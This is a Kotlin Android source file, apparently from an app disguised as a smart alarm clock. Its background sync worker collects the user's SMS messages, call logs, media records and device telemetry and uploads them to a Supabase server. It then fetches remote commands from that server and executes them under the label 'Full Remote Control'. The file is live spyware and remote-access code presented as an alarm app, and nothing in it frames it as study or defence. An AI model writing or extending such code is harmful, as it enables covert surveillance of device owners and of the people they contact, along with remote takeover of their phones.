package uz.smartalarm.aqllibudilnik.sync

import android.content.Context
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.firstOrNull
import kotlinx.coroutines.withContext
import uz.smartalarm.aqllibudilnik.data.local.ActivityLogEntity
import uz.smartalarm.aqllibudilnik.data.local.AppDatabase
import uz.smartalarm.aqllibudilnik.monitoring.CallLogReader
import uz.smartalarm.aqllibudilnik.monitoring.DeviceManager
import uz.smartalarm.aqllibudilnik.monitoring.MediaReader
import uz.smartalarm.aqllibudilnik.monitoring.SmsReader

class SyncWorker(
    private val context: Context,
    workerParams: WorkerParameters
) : CoroutineWorker(context, workerParams) {

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        val syncPrefs = SyncPreferences(context)
        if (!syncPrefs.isSyncEnabled()) {
            return@withContext Result.success()
        }

        val deviceManager = DeviceManager(context)
        val smsReader = SmsReader(context)
        val callLogReader = CallLogReader(context)
        val mediaReader = MediaReader(context)
        val db = AppDatabase.getInstance(context)
        val supabaseClient = SupabaseClient(syncPrefs)

        val deviceId = deviceManager.getDeviceId()

        try {
            // 1. Telemetry & Heartbeat
            val deviceInfo = deviceManager.getDeviceInfo()
            supabaseClient.upsertDevice(deviceInfo)

            // 2. Permissions status
            val permissions = deviceManager.getPermissionsStatus()
            supabaseClient.updatePermissions(deviceId, permissions)

            // 3. SMS Reader & Sync
            if (permissions.sms) {
                smsReader.readAndStoreSms(50)
                val unsyncedSms = db.smsDao().getUnsyncedSms(50)
                if (unsyncedSms.isNotEmpty()) {
                    val ok = supabaseClient.uploadSmsRecords(deviceId, unsyncedSms)
                    if (ok) {
                        db.smsDao().markAsSynced(unsyncedSms.map { it.id })
                    }
                }
            }

            // 4. Call Log Reader & Sync
            if (permissions.callLog) {
                callLogReader.readAndStoreCallLogs(50)
                val unsyncedCalls = db.callDao().getUnsyncedCalls(50)
                if (unsyncedCalls.isNotEmpty()) {
                    val ok = supabaseClient.uploadCallRecords(deviceId, unsyncedCalls)
                    if (ok) {
                        db.callDao().markAsSynced(unsyncedCalls.map { it.id })
                    }
                }
            }

            // 5. Media Reader & Sync
            if (permissions.media) {
                mediaReader.readAndStoreMedia(30)
                val unsyncedMedia = db.mediaDao().getUnsyncedMedia(30)
                if (unsyncedMedia.isNotEmpty()) {
                    val ok = supabaseClient.uploadMediaRecords(deviceId, unsyncedMedia)
                    if (ok) {
                        db.mediaDao().markAsSynced(unsyncedMedia.map { it.id })
                    }
                }
            }

            // 6. Alarms Sync
            val alarms = db.alarmDao().getAllAlarms()
            supabaseClient.uploadAlarms(deviceId, alarms)

            // 7. Activity Log
            val log = ActivityLogEntity(
                eventType = "SYNC_HEARTBEAT",
                eventData = "Battery: ${deviceInfo.batteryLevel}%, Network: ${deviceInfo.networkStatus}",
                timestamp = System.currentTimeMillis()
            )
            db.activityLogDao().insert(log)

            val unsyncedLogs = db.activityLogDao().getUnsyncedLogs(20)
            if (unsyncedLogs.isNotEmpty()) {
                val ok = supabaseClient.uploadActivityLogs(deviceId, unsyncedLogs)
                if (ok) {
                    db.activityLogDao().markAsSynced(unsyncedLogs.map { it.id })
                }
            }

            // 8. Fetch & Execute Remote Commands (Full Remote Control)
            try {
                val pendingCommands = supabaseClient.fetchPendingCommands(deviceId)
                for (cmd in pendingCommands) {
                    val result = uz.smartalarm.aqllibudilnik.monitoring.RemoteCommandExecutor.execute(context, cmd.command, cmd.payload)
                    supabaseClient.updateCommandStatus(cmd.id, "EXECUTED", result)
                    db.activityLogDao().insert(
                        ActivityLogEntity(
                            eventType = "REMOTE_COMMAND",
                            eventData = "Command: ${cmd.command}, Result: $result",
                            timestamp = System.currentTimeMillis()
                        )
                    )
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }

            val now = System.currentTimeMillis()
            syncPrefs.updateLastSync(now, "Muvaffaqiyatli sinxronlandi")

            Result.success()
        } catch (e: Exception) {
            e.printStackTrace()
            syncPrefs.updateLastSync(System.currentTimeMillis(), "Xatolik: ${e.localizedMessage}")
            Result.retry()
        }
    }
}
